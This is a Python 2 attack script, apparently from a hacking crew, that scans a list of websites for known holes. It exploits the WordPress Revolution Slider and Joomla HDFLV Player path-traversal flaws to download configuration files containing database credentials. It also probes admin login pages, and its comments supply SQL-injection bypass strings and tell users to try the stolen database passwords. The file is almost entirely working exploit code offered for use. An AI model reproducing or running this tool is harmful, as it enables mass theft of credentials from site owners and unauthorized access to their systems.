import httplib, sys, os, time
from platform import system
#HELP : 3 Exploit Bypass - revslider- hdflvp
#admin panel = BYpass use noredirect / or  user : 'or''='  pass: 'or''='   / or use  user : admin pass: admin ^^
# revslider download config and try db_user +db_host + db_pass
#hdflvp download config  and try $user + $host + $pass
#fuck all noob this is simple bot ^^ :) not  auto upload ;)
#Script By  Me MR.joker x -_-
def clearscr():
    if system() == 'Linux':
        os.system("clear")
    if system() == 'Windows':
        os.system('cls')
        os.system('color a')
    else:
        pass
clearscr()


def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(4. / 100)

print"""
                        #     #     #####      #        ###    #        ##     #  #####                     
                         #   #      #   #      #       #      # #       # #   #   #   #                       
                          # #       #   #      #       #     #####      #  # #    #   #            
                           #        #####      #####    ### #     #     #   #     #####                   
                                                                                MR.joker x   volcano team
        """
slowprint("\n\t\t\t\t\tCoded By " + "./MR. joker x hacker By volcano " + "\n\t\t\t\t\t\t            Facebook: https://m.facebook.com/profile.php ")

#------------------------------------------------------------------------
of = "/admin/login.php"
#----------------------------------------------------------------------------
jsk = "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
#----------------------------------------------------------------------------------
hdf = "/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php"
#------------------------------------------------------------------------------------------
try:
    q = raw_input("Entre List Site: ")
    q = open(q, "r")
except:
    print ("Pffffff Entre List Sites  -_-")

for i in q:
    i = i.rstrip()
    try:
        if i[:7] == "http://":
            i = i.replace("http://", "")
        if i[:8] == "https://":
            i = i.replace("https://", "")
        if i[-1] == "/":
            i = i.replace("/", "")
################ BYPASS ##########################
        conn = httplib.HTTPConnection(i)
        conn.request("POST", of)
        conn = conn.getresponse()
        html = conn.read()
############ Config WP ###########################
        connwp = httplib.HTTPConnection(i)
        connwp.request("POST", jsk)
        connwp = connwp.getresponse()
        htmlwp = connwp.read()
############ Com HDFVLP ##########################
        connjm = httplib.HTTPConnection(i)
        connjm.request("POST", hdf)
        connjm = connjm.getresponse()
        htmljm = connjm.read()
##################################################################################
        if conn.status == 200:
            print("Faund ==========> "), i+ of
            with open("Panel Admin Bypass.txt", "a") as res:
                res.writelines(i + of+ "\n")
#---------------------------------------------------------------------------------
        elif connwp.status == 200 and ("DB_USER" and "DB_PASSWORD" and "DB_HOST") in htmlwp:
            print ("Config WP Faund ==========> "), i + jsk
            with open("wordpres_Config.txt", "a") as wp1:
                wp1.writelines(i + jsk + "\n")
#----------------------------------------------------------------------------------
        elif connjm.status == 200 and ("$user" and "$host" and "$password") in htmljm:
            print ("Config WP Faund ==========> "), i + hdf
            with open("joomla_config.txt", "a") as jm1:
                jm1.writelines(i + hdf + "\n")
        else:
            print("Not Faund : "), i
#########################################################
    except:
        pass